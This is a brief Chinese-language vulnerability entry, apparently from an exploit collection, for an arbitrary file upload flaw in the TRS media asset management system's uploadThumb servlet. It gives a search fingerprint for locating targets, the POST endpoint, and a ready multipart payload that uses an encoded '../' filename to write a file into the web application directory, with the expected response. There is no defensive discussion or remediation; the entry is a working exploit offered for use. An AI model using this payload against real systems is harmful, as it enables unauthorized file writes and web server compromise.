# 拓尔思TRS媒资管理系统uploadThumb存在文件上传漏洞

拓尔思TRS媒资管理系统 ｜ 文件上传 ｜ —
- **指纹**：`"TRS媒资管理系统"`
- **请求**：`POST /mas/servlets/uploadThumb?appKey=sv&uploadingId=asd HTTP/1.1`

**Payload**
```
------WebKitFormBoundarySl8siBbmVicABvTX
Content-Disposition: form-data; name="file";
filename="%2e%2e%2fwebapps%2fmas%2fa%2etxt"
Content-Type: application/octet-stream
1234
------WebKitFormBoundarySl8siBbmVicABvTX--
```
- **响应特征**：200